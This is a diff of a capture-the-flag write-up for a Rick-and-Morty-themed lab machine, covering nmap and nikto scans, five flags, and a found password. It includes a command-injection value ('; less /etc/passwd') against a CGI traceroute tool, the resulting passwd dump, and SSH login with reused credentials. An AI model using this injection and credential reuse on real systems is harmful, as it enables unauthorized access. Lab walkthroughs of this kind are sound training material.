@@ -1,4 +1,4 @@
-nmap things
+Using nmap on the ip using SYN and version scan.
 
                 └─$ sudo nmap -sV -sS -p- 192.168.42.92
                 Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-17 15:28 IST
@@ -38,38 +38,100 @@ nmap things
                 Nmap done: 1 IP address (1 host up) scanned in 43.42 seconds
 
 
+Flag from fingerprint:
+1.FLAG:{TheyFoundMyBackDoorMorty}
 
 
+http interface flag 9090 flag:
+2.FLAG {THERE IS NO ZEUS, IN YOUR FACE!}
 
+ftp flag Users flag:
+3.FLAG{Whoa this is unexpected}
 
+Busting the directories in the Morty's website using nikto
+result:
 
-http 9090 flag:
-1.FLAG {THERE IS NO ZEUS, IN YOUR FACE!}
+      $ nikto -host http://192.168.42.8/ 
+      - Nikto v2.5.0
+      ---------------------------------------------------------------------------
+      + Target IP:          192.168.42.8
+      + Target Hostname:    192.168.42.8
+      + Target Port:        80
+      + Start Time:         2023-05-18 08:35:41 (GMT5.5)
+      ---------------------------------------------------------------------------
+      + Server: Apache/2.4.27 (Fedora)
+      + /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+      + /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+      + Apache/2.4.27 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+      + OPTIONS: Allowed HTTP Methods: GET, POST, OPTIONS, HEAD, TRACE .
+      + /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+      + /passwords/: Directory indexing found.
+      + /passwords/: This might be interesting.
+      + /icons/: Directory indexing found.
+      + /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+      + 8908 requests: 0 error(s) and 9 item(s) reported on remote host
+      + End Time:           2023-05-18 08:35:48 (GMT5.5) (7 seconds)
+      ---------------------------------------------------------------------------
+      + 1 host(s) tested
 
-
-
-ftp flag:
-2.FLAG{Whoa this is unexpected}
-
-
-
-
-
-
-command sudo nmap -sV -sS -p- -O 192.168.42.92
-Flag from syn fingerprint scan:
-3.FLAG:{TheyFoundMyBackDoorMorty}
-
-
-
-password from mortys: winter
-
-flag from morty pass
+Opening the /passwords/ dir in the ip has a file FLAG.txt 
 4.FLAG{Yeah d- just don't do it.} 
 
+The directory also has a html file called passwords.html where it has a password commented on its html code
+password: winter
 
-uname: Summer
-pass: winter
+Using robots.txt in the ip results:
+
+      They're Robots Morty! It's ok to shoot them! They're just Robots!
+
+      /cgi-bin/root_shell.cgi
+      /cgi-bin/tracertool.cgi
+      /cgi-bin/*
+/cgi-bin/tracertool.cgi contains a command excecutable shell where we use the command:
+      
+      ; less /etc/passwd
+to view the contents of passwd file which has the details of the usernames
+
+Output:
+
+      root:x:0:0:root:/root:/bin/bash
+      bin:x:1:1:bin:/bin:/sbin/nologin
+      daemon:x:2:2:daemon:/sbin:/sbin/nologin
+      adm:x:3:4:adm:/var/adm:/sbin/nologin
+      lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+      sync:x:5:0:sync:/sbin:/bin/sync
+      shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+      halt:x:7:0:halt:/sbin:/sbin/halt
+      mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
+      operator:x:11:0:operator:/root:/sbin/nologin
+      games:x:12:100:games:/usr/games:/sbin/nologin
+      ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
+      nobody:x:99:99:Nobody:/:/sbin/nologin
+      systemd-coredump:x:999:998:systemd Core Dumper:/:/sbin/nologin
+      systemd-timesync:x:998:997:systemd Time Synchronization:/:/sbin/nologin
+      systemd-network:x:192:192:systemd Network Management:/:/sbin/nologin
+      systemd-resolve:x:193:193:systemd Resolver:/:/sbin/nologin
+      dbus:x:81:81:System message bus:/:/sbin/nologin
+      polkitd:x:997:996:User for polkitd:/:/sbin/nologin
+      sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
+      rpc:x:32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin
+      abrt:x:173:173::/etc/abrt:/sbin/nologin
+      cockpit-ws:x:996:994:User for cockpit-ws:/:/sbin/nologin
+      rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
+      chrony:x:995:993::/var/lib/chrony:/sbin/nologin
+      tcpdump:x:72:72::/:/sbin/nologin
+      RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
+      Morty:x:1001:1001::/home/Morty:/bin/bash
+      Summer:x:1002:1002::/home/Summer:/bin/bash
+      apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+We can try the three usernames and the password winter with ssh
+command:
+  
+      $ssh Summer@192.168.42.8 -p 22222
+
+uname: Summer   pass: winter   satisfied!
+Inside the Summer dir we have a FLAG.txt 
+
 5.FLAG{Get off the high road Summer!} 
 
 
